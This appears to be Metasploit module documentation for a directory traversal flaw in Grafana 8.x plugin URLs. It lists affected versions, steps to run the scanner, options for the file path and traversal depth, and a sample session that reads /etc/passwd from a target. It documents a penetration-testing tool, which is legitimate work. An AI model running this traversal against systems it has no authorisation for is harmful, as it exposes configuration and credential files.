## Vulnerable Application

Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal
through the plugin URL.  A valid plugin ID is required, but many are installed by default.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/grafana_plugin_traversal`
4. Do: `set rhosts [ip]`
5. Do: `run`
6. You should retrieve a file.

## Options

### FILEPATH

The path to the file to read.  Defaults to `/etc/grafana/grafana.ini`

### DEPTH

The depth of `../` needed to get to the file system root.  Defaults to `13`

## Scenarios

### Grafana 8.3.0 on Ubuntu 20.04

```
[*] Processing grafana.rb for ERB directives.
resource (grafana.rb)> use auxiliary/scanner/http/grafana_plugin_traversal
resource (grafana.rb)> set rhosts 1.1.1.1
rhosts => 1.1.1.1
resource (grafana.rb)> set verbose true
verbose => true
resource (grafana.rb)> set filepath /etc/passwd
filepath => /etc/passwd
resource (grafana.rb)> run
[+] Detected vulnerable Grafina: 8.3.0
[*] Attempting plugin: alertlist
[+] root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:112:117::/usr/share/grafana:/bin/false

[+] 1.1.1.1:3000 - File saved in: /home/metasploit/.msf4/loot/20211215162817_default_1.1.1.1_grafana.loot_096504.bin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
